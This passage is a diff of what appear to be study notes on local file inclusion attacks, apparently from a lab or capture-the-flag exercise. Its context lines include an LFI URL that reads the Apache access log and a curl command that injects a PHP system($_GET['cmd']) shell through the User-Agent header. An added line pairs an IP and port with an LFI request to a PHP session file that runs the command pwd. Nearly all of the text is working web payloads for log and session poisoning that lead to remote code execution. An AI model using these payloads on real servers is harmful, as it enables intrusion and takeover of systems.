@@ -346,3 +346,7 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
 
  curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
 
+http://83.136.250.104:57381/index.php?language=/var/lib/php/sessions/sess_6hmmieb15da6drl4acarphpnp1&cmd=pwd
+
+# Automated Scanning
+
